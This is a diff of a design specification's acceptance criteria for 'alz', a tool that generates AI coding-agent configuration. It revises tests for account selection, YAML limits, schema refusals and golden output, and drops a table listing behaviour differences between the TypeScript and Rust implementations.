     with a clear message, and `--adopt` moves it into `.layer/agents/`.
 15. **Protected paths:** files under `.claude/agent-memory/`, `backlog/`, `docs/` and `specs/`
@@ -3993,15 +3831,13 @@ The tool is done when all of these pass in CI (fixtures under `test/fixtures/`):
     apostrophe gets no shell command. Without a declaration, `AGENTS.md` has no Commits
     section.
 
-Tests 19 to 24 are planned with account selection (§7.13); each names its task, and the
-parts that are built say so. The numbers
-in this list are not file numbers: 19 to 23 become new test files with the next free `NN`,
-and 24 adds cases to the existing `test/acceptance/24-untrusted-repo.test.ts`. All use a fake
+Items 19 to 24 cover account selection (§7.13); each names its task, and the parts that are not
+built yet say so. The numbers in this list are not fixture numbers. Their tests use a fake
 `HOME`, `XDG_CONFIG_HOME`, `XDG_STATE_HOME` and `XDG_CACHE_HOME`, never a real account folder.
 They remove `__MISE_DIFF`, `DIRENV_DIFF` and the agent-session markers (§7.13) from the
-environment unless a case sets them, because `mise run test` and an agent session pass them on.
+environment unless a case sets them, because `mise run` and an agent session pass them on.
 
-19. **Account resolution** (TASK-50.10, `test/acceptance/31-account-which.test.ts`): `alz account which` reports each source per target
+19. **Account resolution** (TASK-50.10): `alz account which` reports each source per target
     (`use`, `environment`, `user config`, `layer`, `default`) and the paths of both files. A
     `folders` entry matches whole path segments and the longest one wins. A symlinked path, a
     case variant on a case-insensitive file system and a nested stack manifest each resolve
@@ -4020,14 +3856,10 @@ environment unless a case sets them, because `mise run test` and an agent sessio
     a cache miss, and a repository that only contains a configured account folder fails
     closed. A marker string in those variables appears in no output, and the resolver
     reads only the names it lists from the environment. The command runs no git and writes
-    nothing (a trace of the file system and subprocess calls, and the import graph), opens no
-    file of the stack for a repository that is not allowed, and prints no control character
+    nothing, opens no file of the stack for a repository that is not allowed, and prints no control character
     for a directory or source whose text holds them. Build output is byte-identical with and
-    without account settings. The rule that the folders of the two files must be owned by the
-    user is not tested, because a test cannot make a folder owned by another user without
-    root; only the group- and other-writable cases are.
-20. **Account allow** (TASK-50.11, built in `test/acceptance/32-account-allow.test.ts`, with
-    account cases in test 24 and the import-graph cases in test 31): in a fresh clone whose stack names an account, tools start
+    without account settings.
+20. **Account allow** (TASK-50.11): in a fresh clone whose stack names an account, tools start
     on the default account; `alz build` on a terminal prints the allow command, and prints
     nothing about it with an agent-session marker set. `alz account allow` without a
     terminal, or with any one of the six agent-session markers set (each tested, an empty
@@ -4037,31 +3869,28 @@ environment unless a case sets them, because `mise run test` and an agent sessio
     removed included) or declaring source skips step 4 for every target, and
     `alz account which` warns with the old and new values. When a named account fails
     closed, `alz account which` prints `layer step skipped (<reason>); fails closed`, what
-    the hook applies and the fix command (built, test 31, TASK-50.10). A pinned `path:` layer resolves through the cache
+    the hook applies and the fix command (TASK-50.10). A pinned `path:` layer resolves through the cache
     index; a lock `sha` that is not 40 or 64 hex characters, an index entry for another path,
     a malformed index entry, a symlinked index entry, and a layer whose content hash differs
     from the lock are each a cache miss, and the hint says only to run `alz build`. The cache
-    index and the cache misses are built at the reader level (TASK-50.9,
-    `test/acceptance/30-account-cache-read.test.ts`); a cache entry that is missing or a link,
-    a lock that is missing, unreadable or has a missing or duplicate entry, a layer directory
-    or repository root inside an account folder, and a layer inside the repository that is
-    edited, oversize or unparsable (read only to warn, never a miss) are covered there too. In a
+    index and the cache misses hold at the reader level too (TASK-50.9), also for a cache entry
+    that is missing or a link, a lock that is missing, unreadable or has a missing or duplicate
+    entry, a layer directory or repository root inside an account folder, and a layer inside the
+    repository that is edited, oversize or unparsable (read only to warn, never a miss). In a
     repository that is not allowed, resolution reads no file of its stack. No resolution
-    command runs git. Two concurrent writes leave one sorted entry per root (twelve real
-    processes at once, at least one of which waited for the lock), and `alz account allow --remove` removes only this root's entry. The
-    typed answer is read only through `Io.terminal`; a source scan shows that only
-    `src/cli/terminal.ts` reads standard input, and a bundled `bin.ts` run with a pipe, or with
-    no standard input, refuses (a real terminal cannot be driven from a test, so the owner
-    checks once by hand: it accepts in a terminal window and refuses in an IDE terminal with
-    Claude Code). Each unsafe state of `allowed.yaml` (group- or other-writable file or
+    command runs git. Concurrent writes, twelve processes at once, leave one sorted entry per
+    root, and `alz account allow --remove` removes only this root's entry. The typed answer is
+    read only from the terminal: only the terminal module reads standard input, and a run with a
+    pipe, or with no standard input, refuses. It accepts in a terminal window and refuses in an
+    IDE terminal with Claude Code. Each unsafe state of `allowed.yaml` (group- or other-writable file or
     directory, a parent below `$HOME`, `XDG_STATE_HOME` inside the repository, in an account
     folder or moved under mise or direnv, a folder or FIFO in place of the file, over 1 MiB,
     invalid YAML, a top level that is not a list, an ignored entry, a dangling link, a relative
     `$HOME`, an unknown user id, a file in a git work tree, a link to a file that is not empty,
     `[]` or alz's own) refuses and leaves the state directory byte-identical. What `allow` shows
     and asks about is escaped, not stripped: a zero-width character or a look-alike letter in a
-    source prints as `\u{XXXX}`, and the prompt itself names the root and the source. A trace
-    shows every write under the state directory and no subprocess.
+    source prints as `\u{XXXX}`, and the prompt itself names the root and the source. Every
+    write is under the state directory, and no subprocess runs.
 21. **`alz run`** (TASK-50.3): for `claude` and `codex`, with and without `--account`,
     arguments and the exit code pass through. An unknown tool or account, a missing named
     folder whether named or resolved, and a cache miss, a changed declaration or a recorded
@@ -4091,15 +3920,12 @@ environment unless a case sets them, because `mise run test` and an agent sessio
     `alz-blocked`, the configured `default_name`, a symlinked account folder or parent, and a
     `--share` item that §7.13 does not list (before planning), and a rerun with the same
     arguments changes nothing. `alz doctor` reports no item as not linked, does not count the
-    blocked folders as accounts and warns when one exists. A file-access trace shows that
-    neither command opens a file inside an account folder.
-24. **Untrusted repository**, account cases. Built (TASK-50.8, in
-    `test/acceptance/24-untrusted-repo.test.ts`): a repo layer (whatever its `kind`), a group
+    blocked folders as accounts and warns when one exists. Neither command opens a file inside
+    an account folder.
+24. **Untrusted repository**, account cases (TASK-50.8): a repo layer (whatever its `kind`), a group
     layer, a public `client` layer, a second `client` layer, or a `client` layer reached
     through a link inside the repository that declares `account` fails the build and names
-    the layers, and `alz init` prints it as a warning (the init case is in
-    `test/acceptance/29-account-layer.test.ts`, which also covers the field's schema and
-    which layer wins). A layer that sets `CLAUDE_CONFIG_DIR`,
+    the layers, and `alz init` prints it as a warning. A layer that sets `CLAUDE_CONFIG_DIR`,
     `CODEX_HOME`, `HOME`, `XDG_CONFIG_HOME`, `XDG_STATE_HOME` or `XDG_CACHE_HOME` through
     `settings.yaml` (Claude `env`, or a Codex `shell_environment_policy` whose `set` names one,
     whose `exclude` matches one or whose `filters` entry not set to `include` matches one,
@@ -4107,18 +3933,17 @@ environment unless a case sets them, because `mise run test` and an agent sessio
     settings, `.mcp.json`, plugin manifest, agent or `.toml` file (at any depth, whatever its
     target) fails
     the build and names the layer, as does a passthrough path with a non-ASCII character; a Codex policy that only changes
-    `include_only` or `inherit`, or excludes other names, still builds. Built (TASK-50.10, in
-    the same file): `alz account which` ignores a refused declaration with one
+    `include_only` or `inherit`, or excludes other names, still builds. `alz account which` ignores a refused declaration with one
     warning, whatever the number of targets, and the client's allowed account still applies;
-    the resolver that `alz run` and the hook will use reports it once. Built (TASK-50.11): a
+    the resolver that `alz run` and the hook will use reports it once (TASK-50.10). A
     declaration made by the repository's own layer is refused by `alz account allow`, an
     external client layer's source is shown quoted before the prompt, and a hub directory whose
-    name holds ESC prints no control character.
-25. **Name order** (TASK-64, `test/acceptance/33-name-order.test.ts`): instruction files `z.md`,
+    name holds ESC prints no control character (TASK-50.11).
+25. **Name order** (TASK-64): instruction files `z.md`,
     `｡.md` (U+FF61) and `😀.md` (U+1F600) give `AGENTS.md` blocks in that order; the
     layer's content hash in `layer.lock` lists its files in that order (§5.3); `.claude/settings.json`
     keys `-x`, `10`, `9`, `a`, `｡`, `😀` appear in that order; `alz check` then passes.
-26. **YAML limits** (TASK-59, TASK-60, TASK-62, `test/acceptance/34-yaml-limits.test.ts`),
+26. **YAML limits** (TASK-59, TASK-60, TASK-62),
     through `alz lint --layer`:
     - a `layer.yaml` at each limit of §7.13 "YAML limits" lints;
     - one past a limit is the error `yaml`: 1 MiB + 1 byte, 101 aliases, 65 levels, 20001 nodes,
@@ -4127,14 +3952,12 @@ environment unless a case sets them, because `mise run test` and an agent sessio
       reaches the output, and an escape that decodes to a control character;
     - `!foo` and `!!binary` are the error `yaml-tag`;
     - a file with CRLF line ends lints.
-27. **Layer and manifest schema** (TASK-61, `test/acceptance/35-manifest-schema.test.ts`):
+27. **Layer and manifest schema** (TASK-61):
     - `alz lint` in a repository refuses `ref: [x]` and `ref: 1.10` with `manifest`, naming
       `stack[<n>].ref` and printing neither value, and gets past `ref: "1.10"`;
     - `alz lint --layer` refuses `version: 1.10` with `layer`, naming `version`.
 28. **Sources and the layer cache through `alz lint`** (TASK-55.4; TASK-52, TASK-53, TASK-63,
-    TASK-68, TASK-69, TASK-71). These are lint twins in tests 16, 24, 26, 28 and 30, which
-    run `alz lint` in the repository where the build cases run `alz build`. Where a case needs
-    a lock, the suite writes one.
+    TASK-68, TASK-69, TASK-71).
     - The cases about sources and the cache get the same verdicts through `alz lint` as through
       `alz build`.
     - With `XDG_CACHE_HOME` empty or relative, the cache is `~/.cache/agent-layerz` under the
@@ -4147,20 +3970,15 @@ environment unless a case sets them, because `mise run test` and an agent sessio
       ESC, CR and U+202E leaves none of them in the output.
     - A layer holding a name with the byte 0xFF is the error `layer`, on Linux only.
     - A `git:` source with credentials is the error `source`, and the token appears nowhere.
-    - The cases that belong to no existing test file (TASK-52, TASK-53, TASK-63, TASK-69) are in
-      `test/acceptance/36-sources-and-cache-guards.test.ts`, each as an `alz lint` case and an
-      `alz build` case (an `alz check` case for the hook).
-
-    The cases the TypeScript `alz` fails are marked as reference drift (`test/drift.ts`). Their
-    `alz build` and `alz check` forms are checked against the Rust `alz` in R5 (TASK-55.6).
-
-29. **Settings and MCP keys** (TASK-55.5, `test/acceptance/37-settings-targets.test.ts`): a
+    - Each of these holds for `alz build` as well, and the pre-commit hook case for `alz check`
+      (TASK-52, TASK-53, TASK-63, TASK-69).
+29. **Settings and MCP keys** (TASK-55.5): a
     settings or MCP file whose top-level key is not a known target is refused, whatever the key.
     For `settings.yaml` the known targets are `claude` and `codex`; for `mcp.yaml` the keys are
     server ids (§7.7). Through `alz lint --layer` the refusal is an error naming the file; through
-    `alz build` it also writes no output. Both are reference drift against the TypeScript `alz`.
-30. **The writer and generated headers** (TASK-55.6): each rule of §4.3 has an `alz build` case
-    and, where it reports, an `alz check` case. A file that `layer.lock` lists but whose bytes no
+    `alz build` it also writes no output.
+30. **The writer and generated headers** (TASK-55.6): each rule of §4.3 holds for `alz build`
+    and, where it reports, for `alz check`. A file that `layer.lock` lists but whose bytes no
     longer match and that has no mark is never overwritten or deleted. A path under a link, and a
     path that is not a regular file, is a collision, and nothing is written through the link. A
     passthrough `.claude/Settings.json` collides with the generated `.claude/settings.json`. A file
@@ -4168,65 +3986,19 @@ environment unless a case sets them, because `mise run test` and an agent sessio
     C1 control or a format character is the error `layer`. A header source holding such a character
     or `-->`, through a layer version, a ref or a path, is the error `layer`. `É` and `é` fold to
     one path, and `?` in `protected_paths` matches a character above U+FFFF. `--adopt` refuses text the layer reader would refuse, keeps the comments and
-    every other byte of `layer.yaml`, and writes nothing when one file cannot be adopted. The cases
-    the TypeScript `alz` fails are reference drift.
-31. **Output parity** (TASK-55.6): for every fixture repository, the files `alz build` writes and
-    `layer.lock` are byte-identical to golden trees made once from the TypeScript `alz` by a
-    script and committed. A Rust integration test compares them. A golden file that alz writes
-    differently on purpose carries a drift mark naming its task and the spec rule. Each reference
-    drift case of §10.2 that adoption can reach has an acceptance case checking alz's own bytes
-    (TASK-73).
-32. **Commit identity and accounts in Rust** (TASK-55.7, R6): tests 24, 26 and 28 to 32 pass
-    against the Rust `alz`, every line they assert is stated in §9.4, §10.1 and §10.3, and
-    `test/ci/r6-pending.json` is emptied and then deleted, so `test/ci/check-acceptance-report.ts`
-    fails the Rust acceptance job on any failing case. `alz account allow`, its prompt,
-    Ctrl-C at the prompt and the account note are driven through a pseudo-terminal from
-    `alz-test-support`. Rust tests show what no acceptance case can set up: `alz account which`
-    resolves the working directory once on every platform (the TypeScript `alz` resolves it
-    several times on Linux, so `test/reference/31` asserts it on macOS only); the identity
-    step's git calls get none of the variables §9.4 removes; a link at `.git` or `.git/config`
-    found before a write stops it and one found after it is reported; and with `HOME` unset and
-    no user database entry, resolution fails closed (TASK-72). The cases the TypeScript `alz`
-    fails are reference drift; R6.16 (TASK-55.7.16) checks the drift list against
-    `grep -rn referenceDrift test`.
+    every other byte of `layer.yaml`, and writes nothing when one file cannot be adopted.
+31. **Golden output** (TASK-55.6): for every fixture repository, the files `alz build` writes and
+    `layer.lock` are byte-identical to the golden trees committed for it. The layer files
+    `alz build --adopt` writes follow §10.2, also where a rule quotes or escapes text (TASK-73).
+32. **Commit identity and accounts** (TASK-55.7): every line that the commit identity step,
+    `alz account which` and `alz account allow` print is stated in §9.4, §10.1 and §10.3.
+    `alz account allow`, its prompt, Ctrl-C at the prompt and the account note behave on a
+    terminal as §7.13 says. `alz account which` resolves the working directory once on every
+    platform; the identity step's git calls get none of the variables §9.4 removes; a link at
+    `.git` or `.git/config` found before a write stops it and one found after it is reported;
+    and with `HOME` unset and no user database entry, resolution fails closed (TASK-72).
 
 ---
-
-### The reference drift list (§13)
-
-Every acceptance case marked `referenceDrift(<task>, ...)` is a case the TypeScript `alz` fails and
-the Rust `alz` passes. The cutover pull request cites this list; `grep -rn referenceDrift test`
-finds each case.
-
-| Task | Files | What differs |
-|---|---|---|
-| TASK-52 | 36 | layers and the layer cache inside an account folder or the home folder are refused |
-| TASK-53 | 36 | an empty or relative `XDG_CACHE_HOME` counts as unset |
-| TASK-55.3 | 24, 26, 29, 31, 34, 35, 43 | YAML tags, escapes that decode to control characters (in a `commit_identity` before `build --adopt` writes, and in a `root` or `source` of `allowed.yaml`, which is then ignored as not valid YAML, and a repository path holding ESC, which `alz account allow` refuses to write: R6), `version: 1.10`, account fields as schema errors |
-| TASK-55.4 | 24 | a refused hook or source is neither run nor written |
-| TASK-55.5 | 37 | refusals of unknown Claude or Codex keys in `settings.yaml` through lint and build |
-| TASK-55.5.6 | 04 | an overlay may not widen a path or command scope |
-| TASK-55.5.12 | 24 | nested `env` mappings are checked to depth 128, not 32 |
-| TASK-55.5.16 | 24, 37 | an agent's native `mcpServers`, `mcp_servers` and `hooks` are refused as `agent`; the floor field flags |
-| TASK-55.6 | 22 | `ls` lists in name order; `explain` prints the diagnostic prefix |
-| TASK-55.6.13, TASK-55.6.14 | 20 | adoption keeps agents with native hooks out; hook scripts move to `hooks/scripts/` |
-| TASK-55.6.7 | 39 | the writer's rules: a file the lock lists whose bytes differ from the recorded ones, a generated path below a link and another kind of entry at a generated path are collisions; such a file, `layer.yaml` and files under `.layer/` are never deleted or overwritten; a passthrough file that is a case variant of a generated one is the error `passthrough`, and a layer file at a case variant of a protected path is warned about and not written |
-| TASK-55.6.15 | 24, 28 | wording of a refused lock, cache entry or pinned tree (§5.3, §6); a file name with a control character is refused before names are compared; the search for `AGENTS.override.md` refused a folder it cannot name (replaced by TASK-84: it enters such a folder) |
-| TASK-55.7 | 12, 42 | `alz doctor` does not read `ALZ_ACCOUNT_DIRS`; it does not list a blocked folder (`~/.claude-alz-blocked`) as an account folder and warns once for each that exists (TASK-50.4); `alz build` and `alz check` in a repository that is `$HOME` or lies inside the folder `CLAUDE_CONFIG_DIR` names stop with exit 1 and print no account note (§6, §10.3) |
-| TASK-59, TASK-60, TASK-61, TASK-62 | 34, 35 | YAML aliases, depth and size limits, manifest entry errors |
-| TASK-63 | 36 | a build in a linked worktree leaves the index alone |
-| TASK-64 | 33 | name order by code point (AGENTS.md, settings.json, content hash) |
-| TASK-68 | 26 | the first line left after control characters are removed |
-| TASK-71 | 24 | credentials in a layer source are refused |
-| TASK-73 | 38 | text the reference writes plain that alz would read as an integer is quoted; a space between line feeds in long double-quoted text is one escaped space (§10.2) |
-| TASK-79 | 37 | Claude settings keys and agent fields need a recorded type, finite numbers inside the documented range |
-
-Some differences are stated with their task where the rule is, and have no case here, because only a
-file-system trace shows them or no acceptance case asserts them: the names the TypeScript `alz`
-`lstat`s inside an account folder through a planted link (§7.13 "No fetch on resolve",
-TASK-52), the git variables it removes (§9.4), its `.git/config resolves outside the repository`
-and by-hand steps on lines of their own (§10.3), and the unstripped kind of an ignored `account`
-declaration (§7.12) (TASK-55.7).
 
 ## 14. Rollout (generic, for any client)
 
